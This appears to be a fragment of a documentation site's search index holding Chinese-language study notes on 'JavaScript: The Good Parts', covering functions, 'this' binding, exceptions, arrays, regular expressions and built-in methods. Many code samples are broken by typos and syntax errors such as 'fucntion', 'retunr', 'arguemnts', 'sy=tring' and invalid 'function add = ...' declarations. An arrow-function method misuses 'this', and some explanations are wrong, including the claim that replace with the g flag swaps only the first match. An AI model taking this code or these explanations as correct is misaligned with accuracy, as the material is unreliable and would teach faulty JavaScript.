<p>\u51fd\u6570\u53ef\u4ee5\u88ab\u5176\u4ed6\u90e8\u5206\u8c03\u7528\u3002</p>"},{"location":"other/JS-the-good-parts/#_8","title":"\u5b9a\u4e49\u51fd\u6570","text":"<p>\u51fd\u6570\u7684\u56db\u90e8\u5206\uff1aFunction\u3001\u51fd\u6570\u540d\uff08\u533f\u540d\u51fd\u6570\uff09\u3001\u51fd\u6570\u53c2\u6570\uff08parameters\uff0c\u5f62\u53c2\uff0c\u53ef\u9009\uff09\u3001\u51fd\u6570\u4f53\u3002\u51fd\u6570\u53ef\u4ee5\u4f5c\u4e3a\u53e6\u4e00\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u6216\u8005\u8fd4\u56de\u503c\u3002\u5b50\u51fd\u6570\u53ef\u4ee5\u8bbf\u95ee\u5185\u90e8\u7684\u53d8\u91cf\u548c\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u5916\u90e8\u7236\u51fd\u6570\u7684\u53d8\u91cf\u548c\u53c2\u6570\u3002\u51fd\u6570\u7684\u95ed\u5305\u3002</p>"},{"location":"other/JS-the-good-parts/#_9","title":"\u8c03\u7528\u51fd\u6570","text":"<p>\u51fd\u6570\u5728\u8c03\u7528\u8fc7\u7a0b\u4e2d\uff0c\u9664\u4e86\u4f20\u5165\u7684\u53c2\u6570\uff08\u62ec\u53f7\u4e2d\u7684\u53c2\u6570\uff09\uff0c\u8fd8\u9ed8\u8ba4\u4f20\u5165this\uff08this\u7684\u503c\u53d6\u51b3\u4e8e\u51fd\u6570\u7684\u56db\u79cd\u8c03\u7528\u6a21\u5f0f\uff09\u548carguments\uff08\u5b9e\u53c2\uff09\u3002\u5f53\u5b9e\u53c2\u5927\u4e8e\u5f62\u53c2\uff0carguments\u4f1a\u5b58\u50a8\u5f53\u524d\u7684\u51fd\u6570\u5168\u90e8\u5b9e\u53c2\u3002</p> <p>arguments\u5728\u51fd\u6570\u53c2\u6570\u4e0d\u786e\u5b9a\u7684\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\uff08\u6216\u8005\u8f83\u591a\u53c2\u6570\uff09arguments\u662f\u4e00\u4e2a\u4f2a\u6570\u7ec4\uff0c\u4e0d\u5177\u6709\u6570\u7ec4\u7684\u65b9\u6cd5\uff0c\u8fd9\u5c31\u662f\u5c40\u9650\u6027\u3002</p> <pre><code>let sum = function() {\n  let sum = 0;\n  for (let i = 0; i &lt; arguments.length; i ++) {\n    sum += arguemnts[i];\n  }\n  return sum;\n};\n</code></pre>"},{"location":"other/JS-the-good-parts/#_10","title":"\u51fd\u6570\u7684\u56db\u79cd\u8c03\u7528\u6a21\u5f0f","text":"<p>1\u3001\u65b9\u6cd5\u8c03\u7528\u6a21\u5f0f</p> <p>\u51fd\u6570\u4f5c\u4e3a\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002this\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\u3002\u901a\u8fc7this\uff0c\u53ef\u4ee5\u4f7f\u5f97\u5185\u90e8\u51fd\u6570\u8bbf\u95ee\u5bf9\u8c61\u4e2d\u7684\u516c\u5171\u65b9\u6cd5\u548c\u5c5e\u6027\u3002</p> <pre><code>let myObject = {\n  value: 0,\n  increase = (inc) =&gt; {\n    this.value += typeof inc === 'number' ? inc : 1;\n    } \n};\n// \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u662f\u6570\u503c\uff0c\u51fd\u6570\u7684value\u5c5e\u6027\u53e0\u52a0\uff0c\u4e0d\u662f\u6570\u503c\u5c31 + 1\uff1b\nmyObject.increase('test');\nmyObject.increase(2);\nconsole.log(myObject.value === 3);\n</code></pre> <p>2\u3001\u51fd\u6570\u8c03\u7528\u6a21\u5f0f</p> <p>\u4e00\u4e2a\u51fd\u6570\u4e0d\u662f\u4f5c\u4e3a\u5bf9\u8c61\u7684\u65b9\u6cd5\u88ab\u8c03\u7528\uff0c\u800c\u662f\u4f5c\u4e3a\u51fd\u6570\u7684\u5f62\u5f0f\u88ab\u8c03\u7528\uff0c\u6b64\u65f6 this \u6307\u5411\u5168\u5c40\u53d8\u91cf\u3002</p> <pre><code>let myObject = {\n  value = 3;\n}\nmyObject.double = function () {\n  let that = this;\n  let helper = function () {\n    that.value = add(that.value, that.value);\n    console.log(this); //\u5168\u5c40\u53d8\u91cf\n  };\n  helper(); //\u4ee5\u51fd\u6570\u7684\u5f62\u5f0f\u8c03\u7528\u51fd\u6570 helper\n}\nmyObject.double();\nconsole.log(myObject.value);\n</code></pre> <p>3\u3001\u6784\u9020\u5668\u8c03\u7528\u6a21\u5f0f</p> <p>\u4f7f\u7528new\u6784\u9020\u5668\u521b\u5efa\u51fd\u6570\uff0c\u51fd\u6570\u4e2d\u7684this\u7ed1\u5b9a\u5230\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u4e0a\u3002\uff08\u4f7f\u7528\u6784\u9020\u51fd\u6570\u521b\u5efa\u65b0\u5bf9\u8c61\u662f\u65e9\u671f\u7684\u65b9\u6cd5\uff0c\u73b0\u5728\u4f7f\u7528class\u5173\u952e\u5b57\u521b\u5efajs\u4e2d\u7684class\uff09\u3002\u8fd9\u79cd\u65b9\u6cd5\u5728\u6700\u65b0\u7684\u4ee3\u7801\u4e2d\u4e0d\u4f7f\u7528\u3002</p> <pre><code>let Quo = function (string) {\n  this.status = sy=tring;\n}\nQuo.prototype.getStatus = function() {\n  return this.status;\n}\nlet myQuo = new Quo(\"test\");\nmyQue.getStatue();\n</code></pre> <p>4\u3001Apply\u8c03\u7528\u6a21\u5f0f\uff1athis\u6307\u5411apply\u4e2d\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53c2\u6570\u6570\u7ec4\uff1b(\u5bf9\u6bd4call\u65b9\u6cd5\u7684\u4f7f\u7528)\u3002</p> <pre><code>let array = [3, 4];\nlet sum = add.apply(null, array);\nconsole.log(sum === 7);\n\nlet statusObject = {\n  status: \"OK\"\n};\nlet status = Quo.prototype.getStatus.apply(statusObject);\nconsole.log(status === 'OK');\n</code></pre> <p>\u51fd\u6570\u4e2d\u9047\u5230return\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u6267\u884c\u540e\u9762\u7684\u4ee3\u7801\u4e86\u3002</p>"},{"location":"other/JS-the-good-parts/#_11","title":"\u5f02\u5e38\u5904\u7406","text":"<p>\u5f02\u5e38\uff1a\u5e72\u6270\u51fd\u6570\u6b63\u5e38\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684\u4e8b\u6545\uff08\u51fd\u6570\u9700\u8981\u4f20\u5165\u6570\u503c\u578b\u53c2\u6570\uff0c\u5b9e\u9645\u4e0a\u4f20\u5165\u5b57\u7b26\u4e32\u53c2\u6570\uff09\uff0c\u5f53\u53d1\u73b0\u8fd9\u6837\u7684\u4e8b\u6545\uff0c\u7a0b\u5e8f\u9700\u8981\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002</p> <p>throw\u8bed\u53e5\u4f1a\u4e2d\u65ad\u51fd\u6570\u7684\u6267\u884c\uff1b\u4f1a\u629b\u51fa\u4e00\u4e2aexception\u5bf9\u8c61\uff1a\u5177\u6709\u5f02\u5e38\u7684name\u5c5e\u6027\u548c\u63cf\u8ff0\u5f02\u5e38\u7684message\u5c5e\u6027\u3002</p> <p>\u5f02\u5e38\u53ef\u4ee5\u88abtry-catch\u6355\u83b7\u3002\u4ea7\u751f\u5f02\u5e38\u7684\u4ee3\u7801\u88abtry\u8bed\u53e5\u6355\u83b7\uff0c\u51fd\u6570\u4f1a\u8df3\u8f6c\u5230catch\u8bed\u53e5\u6267\u884c\u3002\u4e00\u4e2atry\u8bed\u53e5\u53ea\u4f1a\u6709\u4e00\u4e2a\u6355\u83b7\u6240\u6709\u5f02\u5e38\u7684catch\uff08\u4e00\u4e2atry\u4e2d\u53ea\u6709\u4e00\u4e2acatch\uff09</p> <p>\u5982\u679c\u89e3\u51b3\u5f02\u5e38\u7684\u624b\u6bb5\u53d6\u51b3\u4e8e\u5f02\u5e38\u7684\u7c7b\u578b\uff0c\u5f02\u5e38\u68c0\u67e5\u5668\u9700\u8981\u68c0\u67e5\u5f02\u5e38\u5bf9\u5baa\u6cd5\u7684name\u5c5e\u6027\u6765\u786e\u5b9a\u5f02\u5e38\u7684\u7c7b\u578b\u3002</p> <pre><code>function add = (a, b) =&gt; {\n  if (typeof a !== 'number' || typeof b !== 'number') {\n    throw {\n      name: 'TypeError',\n      message: 'add function needs number'\n    };\n  }\n  return a + b;\n}\nfunction tryIt = function() {\n  try {\n    add(\"ten\", 20);\n  }\n  catch (e) {\n    console.log(e);\n  }\n}\n</code></pre>"},{"location":"other/JS-the-good-parts/#_12","title":"\u9012\u5f52","text":"<p>\u9012\u5f52\u5728dom\u6811\u7ed3\u6784\u4e2d\u4f7f\u7528\u8f83\u591a\uff1b</p> <pre><code>let walk_the_dom = fucntion walk (node,func) {\n  // \u628a\u8282\u70b9\u548c\u5904\u7406\u7684\u51fd\u6570\u4f20\u5165\uff0c\u5bf9\u5f53\u524d\u8282\u70b9\u8fdb\u884c\u5904\u7406\uff1b\n  func(node);\n  node = node.firstChild;\n  while (node) {\n    // \u904d\u5386\u6bcf\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5e76\u9012\u5f52\u5904\u7406\n    walk(node, func);\n    node = node.nextSibling;\n  }\n};\n\nlet getElementsByAttribute = function (att, value) {\n  let results = [];\n\n  walk_the_dom(document.body, fucntion(node) {\n    let actual = node.nodeType === 1 &amp;&amp; node.getAttribute(att);\n    if (typeof actual === 'string' &amp;&amp; (actual === value || typeof value !== 'string')) {\n      results.push(node);\n    }\n  });\n  return results;\n}\n</code></pre>"},{"location":"other/JS-the-good-parts/#_13","title":"\u4f5c\u7528\u57df","text":"<p>es6\u4e2d\u5df2\u7ecf\u6709\u5757\u7ea7\u4f5c\u7528\u57df\uff1b</p>"},{"location":"other/JS-the-good-parts/#_14","title":"\u95ed\u5305","text":"<p>\u9700\u8981\u5de9\u56fa</p>"},{"location":"other/JS-the-good-parts/#_15","title":"\u7b2c\u4e94\u7ae0 \u7ee7\u627f","text":"<p>\u9700\u8981\u5de9\u56fa</p>"},{"location":"other/JS-the-good-parts/#_16","title":"\u7b2c\u516d\u7ae0 \u6570\u7ec4","text":"<p>\u5728JS\u4e2d\u6570\u7ec4\u548c\u5bf9\u8c61\u5b9e\u8d28\u90fd\u662f\u5bf9\u8c61\uff0c\u6570\u7ec4\u7684\u5c5e\u6027\u662f\u8fde\u7eed\u7684\u6574\u6570\u3002typeof(Array) = 'object'</p> <pre><code>// \u5224\u65ad\u6570\u7ec4\u7684\u65b9\u6cd5\nvar is_array = function(value) {\n  return value &amp;&amp; typeof value === 'object' &amp;&amp; value.constructor === Array;\n};\n// \u4e0d\u8db3\uff1a\u8bc6\u522b\u4e0d\u540c\u7684window\u6216\u8005frame\u5931\u8d25\n\n//\u6539\u8fdb\u65b9\u6cd5\nvar is_array = function(value) {\n  return Object.prototype.toString.apply(value) === '[object Array]';\n}\n</code></pre> <p>\u6570\u7ec4\u4e2d\u7684\u65b9\u6cd5\u5b58\u653e\u5728 Array.prototype \u4e2d\uff0c\u5bf9\u8c61 Object.prototype \u53ef\u4ee5\u88ab\u6269\u5145\uff0c\u6570\u7ec4\u7684\u539f\u578b\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u88ab\u6269\u5145\u3002</p> <pre><code>Array.method('reduce', fucntion(f, value){\n  for (let i = 0; i &lt; this.length; i ++){\n    value = f(this[i], value);\n  }\n  return value;\n});\n// \u7ed9\u6570\u7ec4\u6269\u5c55\u65b9\u6cd5\uff1a\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\u548c\u521d\u59cb\u503c\uff0c\u5bf9\u6570\u7ec4\u7684\u6bcf\u4e00\u9879\u8fd0\u884c\u51fd\u6570\u3002\u4e0b\u9762\u662f\u5b9e\u9645\u6848\u4f8b\u3002\nlet data = [1, 2, 3, 4];\nvar add = function(a, b) {\n  retunr a + b;\n}\nvar mult = function(a, b) {\n  retunr a * b;\n}\nvar sum = data.reduce(add, 0);\n// \u5c06\u6570\u7ec4\u6267\u884cadd\u65b9\u6cd5\uff0c\u521d\u59cb\u503c\u662f0\nvar prodect = data.reduce(mult, 1);\n// \u5c06\u6570\u7ec4\u6267\u884cmult\u65b9\u6cd5\uff0c\u521d\u59cb\u503c\u662f1\n</code></pre> <p>\u4e00\u4e2a\u6570\u7ec4\u53ef\u4ee5\u901a\u8fc7\u4e0b\u6807\u8bbe\u7f6e\u5c5e\u6027\uff0c\u540c\u65f6\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u70b9\u8bed\u6cd5\u8bbe\u7f6e\u5c5e\u6027\u3002\u53ef\u4ee5\u8bf4\uff0carray.length \u5c31\u662f\u7c7b\u4f3c\u7684\u5bf9\u8c61\u7684\u70b9\u8bed\u6cd5\u3002</p> <p>JS \u6570\u7ec4\u6ca1\u6709\u591a\u7ef4\u6570\u7ec4\uff0c\u652f\u6301\u5143\u7d20\u4e3a\u6570\u7ec4\u7684\u6570\u7ec4\uff0c\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u77e9\u9635\u3002</p> <pre><code>Array.matrix = function(m, n, init) {\n  var mat = [];\n  for (var i = 0; i &lt; m; i++) {\n    a = [];\n    for (var j = 0; j &lt; n; j++) {\n      a[j] = initial;\n    }\n    mat[i] = a;\n  }\n  return mat;\n}\n\nvar myMatrix = Array.matrix(4, 4, 0);\ndocument.writeLn(myMatrix);\n// \u751f\u6210\u4e00\u4e2a0\u586b\u5145\u7684 4*4 \u7684\u77e9\u9635\u3002\n\n// \u5355\u4f4d\u77e9\u9635\nArray.identity = function(n) {\n  let mat = Array.matrix(n, n, 0);\n  for (let i = 0; i &lt; n; i++) {\n    mat[i][i] = 1;\n  }\n  return mat;\n};\nmyMatrix = Array.identity(4);\ndocument.writeln(myMatrix[3][3]);\n</code></pre>"},{"location":"other/JS-the-good-parts/#_17","title":"\u7b2c\u4e03\u7ae0 \u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\u4e66\u5199\u5f88\u590d\u6742\uff0c\u540e\u671f\u7ef4\u62a4\u76f8\u5bf9\u590d\u6742\u3002\u5199\u7684\u65f6\u5019\u6700\u597d\u662f\u77ed\u5c0f\u7cbe\u608d\u3002</p> <pre><code>var parse = /^(?:[A-Za-z]+)?(\\/{0,3})([0-9.\\-A-Za-z]+)(?::(\\d+))?(?:\\/([^?#]*))?(?:\\?([^#]*))?(?:#(.*))?$/;\n\n// \u5212\u5206\u7f51\u5740\n</code></pre>"},{"location":"other/JS-the-good-parts/#_18","title":"\u7b2c\u4e5d\u7ae0 \u65b9\u6cd5","text":""},{"location":"other/JS-the-good-parts/#array","title":"Array","text":"<p>Array.concat \u5c06\u591a\u4e2a\u6570\u7ec4\uff0c\u53d8\u91cf\u7ec4\u5408\u6210\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\u3002\u8fd9\u4e2a\u6570\u7ec4\u4f1a\u6d45\u590d\u5236\u4e00\u4e2a\u6570\u7ec4\uff0c\u5e76\u5c06\u5176\u4ed6\u5143\u7d20\u6216\u8005\u6570\u7ec4\u63d2\u5165\u5230\u65b0\u6570\u7ec4\u540e\u9762\u3002</p> <p>Array.join(seperator) \u5c06\u6570\u7ec4\u7684\u4e0d\u540c\u5143\u7d20\u8fde\u63a5\u6210\u5b57\u7b26\u4e32\uff0c\u539f\u7406\u662f\u5c06\u6bcf\u4e00\u9879\u8f6c\u5316\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e32\u8fde\u63a5\u3002</p> <p>Array.pop() \u79fb\u51fa\u6570\u7ec4\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e76\u8fd4\u56de\uff08\u7c7b\u4f3c\u4e8e\u5806\u6808stack\uff09\uff0c\u5982\u679c\u662f\u7a7a\u6570\u7ec4\uff0c\u90a3\u4e48\u8fd4\u56deundefined\u3002</p> <p>Array.push(item1, item2)\u5728\u6570\u7ec4\u6700\u540e\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20\uff0c\u539f\u59cb\u6570\u7ec4\u6539\u53d8\uff0c\u8fd4\u56de\u503c\u662f\u65b0\u6570\u7ec4\u7684\u957f\u5ea6\u3002</p> <p>Array.reverse() \u6570\u7ec4\u524d\u540e\u7ffb\u8f6c\uff0c\u539f\u59cb\u6570\u7ec4\u53d8\u6210\u65b0\u6570\u7ec4\uff0c\u8fd4\u56de\u503c\u5c31\u662f\u65b0\u6570\u7ec4\u3002</p> <p>Array.shift() \u79fb\u51fa\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff08\u7a7a\u6570\u7ec4\u8fd4\u56deundefined\uff09shift \u6bd4 pop \u901f\u5ea6\u6162\u5f88\u591a\u3002</p> <p>array.unshift \u5728\u7b2c\u4e00\u4f4d\u589e\u52a0\u5143\u7d20\uff0c\u8fd4\u56de\u503c\u662f\u65b0\u6570\u7ec4\u7684\u957f\u5ea6</p> <p>array.slice(a, b) \u6d45\u590d\u5236\u6570\u7ec4\u7684\u4e00\u90e8\u5206\uff0c\u524d\u9762\u8bd5\u95ed\u533a\u95f4\u540e\u9762\u662f\u5f00\u533a\u95f4\uff1b\u5982\u679c\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u4ece\u8fd9\u4e2a\u53c2\u6570\u590d\u5236\u5230\u6570\u7ec4\u7684\u672b\u5c3e\u3002=&gt;\u590d\u5236\u65e7\u6570\u7ec4\u4e2d\u7684\u4e00\u90e8\u5206</p> <p>Array.sort() \u5b57\u7b26\u4e32\u6392\u5e8f\uff1a\u53ef\u4ee5\u7ed9\u5b57\u7b26\u4e32\u8fdb\u884c\u6392\u5e8f\uff0c\u4e0d\u80fd\u76f4\u63a5\u7ed9\u6570\u7ec4\u6392\u5e8f\uff08\u9996\u5148\u5c06\u6570\u7ec4\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\uff0c\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u6bd4\u8f83\uff0c\u901a\u5e38\u4f1a\u51fa\u9519\uff09\uff1b\u5f53\u7136\uff0c\u53ef\u4ee5\u5728\u6b64\u57fa\u7840\u4e0a\uff0c\u589e\u52a0\u4e00\u4e2a\u6570\u7ec4\u6392\u5e8f\u6216\u8005\u5bf9\u8c61\u6392\u5e8f\u7684\u65b9\u6cd5\u3002</p> <p>Array.splice(a, b, c) \u5220\u9664\u6570\u7ec4\u7684\u4e00\u90e8\u5206\uff1a\u5c06\u6570\u7ec4\u7684a\u4f4d\u7f6e\uff0c\u5220\u9664b\u4e2a\u5143\u7d20\uff0c\u52a0\u5165c\u5143\u7d20\u3002\uff08c\u53ef\u9009\u53c2\u6570\uff09</p> <pre><code>var a = [1, 2, 3];\nvar b = [4, 5, 6];\nvar c = a.concat(b, true);\na.push(6,7); // \u8fd9\u91cc\u6539\u53d8\u6570\u7ec4a, \u4e0d\u4f1a\u5f71\u54cd\u65b0\u7684\u6570\u7ec4c\u3002\u56e0\u4e3a\u5df2\u7ecf\u4ea7\u751f\u4e86\u65b0\u7684\u6570\u7ec4c\u3002\nconsole.log(c);\n// [1,2,3,4,5,6,true]\n</code></pre>"},{"location":"other/JS-the-good-parts/#function","title":"Function","text":"<pre><code>// function.apply \u4f20\u9012\u4e00\u4e2a\u7ed1\u5b9a\u5230 this \u4e0a\u7684\u5bf9\u8c61\u548c\u4e00\u4e2a\u53ef\u9009\u7684\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u3002\nFunction.method('bind', function(that) {\n  // \u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\u3002\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u8c03\u7528\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e2a\u65b9\u6cd5\n  var method = this;\n  var slice = Array.prototype.slice;\n  var args = slice.apply(arguments, [1]);\n  return function() {\n    return method.apply(that,\n      args.concat(slice.apply(arguments, [0])));\n  };\n});\n\nlet x = function() {\n  return this.value;\n}.bind({ value: 666 });\n\nalert(x());\n</code></pre> <p>\u6570\u7ec4\u7684 call \u548c apply \uff1a\u5c06\u4e00\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5\u653e\u5728\u53e6\u4e00\u4e2a\u5bf9\u8c61\u4e0a\u9762\uff0c\u53e6\u4e00\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u65b9\u6cd5\u3002</p> <p>Obj1.method1.call(Obj2, para1, para2); object \u5177\u6709method1 \u65b9\u6cd5\uff0c\u4f46\u662f object2 \u6ca1\u6709method1\u65b9\u6cd5\u3002\u6240\u4ee5\u8fd9\u91ccObject2 \u501f\u7528object1 \u7684method \u65b9\u6cd5\uff0c\u7136\u540e\u4f20\u5165\u7684\u53c2\u6570\u662f\u4e24\u4e2a\uff0c\u8fdb\u884c\u7ee7\u627f\u3002</p> <p>Obj1.method2.apply(Obj2, [para1, para2]) apply \u4f20\u5165\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u5176\u4ed6\u7684\u529f\u80fd\u548c\u6548\u679c\u7c7b\u4f3c\u3002</p> <p>\u8be6\u89c1 call.js \u4ee3\u7801</p>"},{"location":"other/JS-the-good-parts/#number","title":"Number","text":"<p>\u6570\u503c\u8f6c\u5316\u6210\u4e0d\u540c\u5b57\u7b26\u4e32\u7684\u51e0\u79cd\u65b9\u6cd5</p> <pre><code>// toExponential() \u8f6c\u6362\u6210\u4e00\u4e2a\u6307\u6570\u5f62\u5f0f\u7684\u5b57\u7b26\u4e32\uff1b\nMath.PI.toExponential(2); // 3.14e+0\n\n// toFixed \u8f6c\u5316\u6210\u4e00\u4e2a\u5341\u8fdb\u5236\u6570\u7684\u5b57\u7b26\u4e32\uff0c\u53c2\u6570\u662f\u5c0f\u6570\u70b9\u540e\u7684\u4f4d\u6570\nMath.PI.toFixed(5); // 3.14159\n\n// toPrecision \u8f6c\u5316\u6210\u4e00\u4e2a\u5341\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\uff0c\u53c2\u6570\u662f\u6570\u5b57\u7684\u7cbe\u5ea6\nMath.PI.toPrecision(3); // 3.14\n\n// toString(16) \u8f6c\u5316\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u53c2\u6570\u662f\u8f6c\u6362\u7684\u8fdb\u5236\uff0c\u9ed8\u8ba4\u662f10\nMath.PI.toSting();\n</code></pre>"},{"location":"other/JS-the-good-parts/#object","title":"Object","text":"<p>object.hasOwnProperty \u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u76d1\u6d4b\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4f46\u662f\u539f\u578b\u94fe\u4e2d\u7684\u540c\u540d\u5c5e\u6027\u4e0d\u4f1a\u68c0\u67e5\uff1b</p> <pre><code>var a = {isLoading: true};\na.hasOwnProperty('isLoading') =&gt; true\n\nvar b = Object.create(a);\n// \u521b\u5efa\u4e00\u4e2a\u65b0\u5bf9\u8c61b\uff0c\u5176\u4e2d\u7684__proto__ \u5c31\u662fa, b\u5bf9\u8c61\u53ef\u4ee5\u8bbf\u95eea\u5bf9\u8c61\u539f\u578b\u94fe\u4e0a\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\nb.hasOwnProperty('isLoading') =&gt; false\nconsole.log(b.isLoading) =&gt; true\n</code></pre>"},{"location":"other/JS-the-good-parts/#regexp","title":"RegExp \u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>exec</p> <p>\u5339\u914d\u5b57\u7b26\u4e32\u7684\u6700\u5f3a\u5927\u6700\u6162\u7684\u65b9\u6cd5\u3002\u5982\u679c\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u4e0d\u540c\u7684\u9879\u5c31\u662f\u5206\u7ec4\u6355\u83b7\u7684\u6587\u672c\u3002\u5982\u679c\u5339\u914d\u5931\u8d25\uff0c\u5c31\u4f1a\u8fd4\u56de null\u3002\u5982\u679c\u5168\u5c40\u68c0\u7d22g\uff0c\u67e5\u627e\u4e0d\u4f1a\u4ece\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u800c\u662f\u4eceregexp.lastIndex \u5f00\u59cb\u3002\u5982\u679c\u8fdb\u884c\u53e6\u4e00\u6b21\u67e5\u8be2\uff0c\u9700\u8981\u5c06 regexp.lastIndex \u91cd\u7f6e\u4e3a0\u3002</p> <pre><code>// \u5c06HTML\u6587\u672c\u5206\u89e3\u6210\u6807\u7b7e\u548c\u6587\u672c\nvar text = '&lt;html&gt;&lt;body bgcolor=linen&gt;&lt;p&gt;' + '&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;';\nvar tags = /[^&lt;&gt;]+|&lt;(\\/?)([A-Za-z]+)([^&lt;&gt;*])&gt;/g;\nvar a, i ;\n\nwhile ((a = tags.exec(text))) {\n  for (i = 0; i &lt; a.length; i++) {\n    console.log((i + a[i]).entityify());\n  }\n}\n</code></pre> <p>test</p> <p>\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\u6700\u7b80\u7b54\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u7684\u662f\u5e03\u5c14\u503c\uff0c\u4e0d\u80fd\u4f7f\u7528\u5168\u5c40\u7684g\u6807\u8bc6\u3002</p> <pre><code>var b = /&amp;.+/.test('Tom &amp;amp; beans');\nRegExp.method('test', function(string) {\n  return this.exec(string) !== null;\n});\n</code></pre>"},{"location":"other/JS-the-good-parts/#string","title":"string","text":"<p>\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\u662f\u6700\u5e38\u7528\u7684\u65b9\u6cd5</p> <pre><code>string.charAt(position); // \u8fd4\u56de\u5b57\u7b26\u4e32\u4e2d\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u5982\u679c\u4f4d\u7f6e\u8d85\u8fc7\u957f\u5ea6\u6216\u8005\u662f\u8d1f\u6570\uff0c\u90a3\u4e48\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\nstring.charCodeAt(pos); // return \u5b57\u7b26\u7801\u4f4d if(pos &gt; string.length) return NaN\nstring.concat('a', 'b'); //\u901a\u5e38\u76f4\u63a5\u52a0\u53f7\u94fe\u63a5\u5b57\u7b26\u4e32\u5373\u53ef\nstring.indexOf('test', 10); // \u4ece\u4f4d\u7f6e10\u5f00\u59cb\u68c0\u9519\uff0c\u67e5\u8be2test\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u5b57\u7b26\u7684\u4f4d\u7f6e\uff0c\u627e\u4e0d\u5230\u8fd4\u56de-1\nstring.lastIndexOF('test', 3); // \u4ece\u672b\u5c3e\u5f00\u59cb\u67e5\u627e\nstring.match(regexp) //\u8ba9\u5b57\u7b26\u4e32\u548c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u5339\u914d\uff0c\u4f9d\u636eg\u6807\u8bc6\u6765\u51b3\u5b9a\u600e\u6837\u8fdb\u884c\u5206\u914d\u3002\u5982\u679c\u6ca1\u6709g, string.match(regexp) \u548c regexp.exec(string) \u7ed3\u679c\u76f8\u540c\u3002\u5982\u679cregexp\u5177\u6709g\u6807\u8bc6\uff0c\u90a3\u4e48\u8fd4\u56de\u4e00\u4e2a\u5339\u914d\u7684\u6570\u7ec4\u3002\nstring.replace('search', 'replace'); // \u5982\u679c\u6807\u660eg\uff0c\u5c31\u662f\u66ff\u6362\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5b57\u7b26\u3002\nstring.search(regexp); // \u7c7b\u4f3c\u4e8eindexOf \u4f20\u5165\u7684\u53c2\u6570\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u5b57\u7b26\u7684\u9996\u5b57\u7b26\u4f4d\u7f6e(\u6ca1\u6709position\u53c2\u6570)\nvar text = 'hello world \"anynone\" tall';\nvar position = text.search(/[\"']/);\n\nstring.slice(start, end); // \u590d\u5236string\u7684\u4e00\u90e8\u5206\u6784\u9020\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u662f\u8d1f\u6570\uff0c\u5c31\u4ece\u540e\u9762\u5f00\u59cb\uff1b\u9ed8\u8ba4end\u662fstring.length.\nstring.split(seperator, limit); // 